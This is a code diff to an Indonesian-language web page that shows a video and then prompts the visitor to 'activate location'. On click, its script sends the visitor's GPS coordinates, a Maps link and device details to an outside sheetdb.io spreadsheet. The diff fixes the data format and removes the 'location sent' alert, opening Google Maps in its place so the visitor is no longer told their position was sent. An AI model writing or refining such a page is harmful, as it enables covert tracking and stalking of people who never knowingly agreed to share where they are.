@@ -12,8 +12,8 @@
 </video>
 
 <div id="box" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
-  <p>Aktifkan lokasi</p>
-  <button onclick="go()" style="padding:10px;">Aktifkan</button>
+  <p>Klik untuk aktifkan lokasi</p>
+  <button onclick="go()" style="padding:10px; font-size:16px;">Aktifkan</button>
 </div>
 
 <script>
@@ -31,19 +31,23 @@ function go() {
     let lat = pos.coords.latitude;
     let lon = pos.coords.longitude;
 
+    // KIRIM KE SHEETDB (SUDAH FIX)
     fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
-        waktu: new Date().toLocaleString(),
-        latitude: lat,
-        longitude: lon,
-        maps: "https://www.google.com/maps?q=" + lat + "," + lon,
-        device: navigator.userAgent
+        data: [{
+          waktu: new Date().toLocaleString(),
+          latitude: lat,
+          longitude: lon,
+          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
+          device: navigator.userAgent
+        }]
       })
     });
 
-    alert("Lokasi terkirim");
+    // LANGSUNG BUKA MAPS
+    window.open("https://www.google.com/maps?q=" + lat + "," + lon);
 
   });
 }
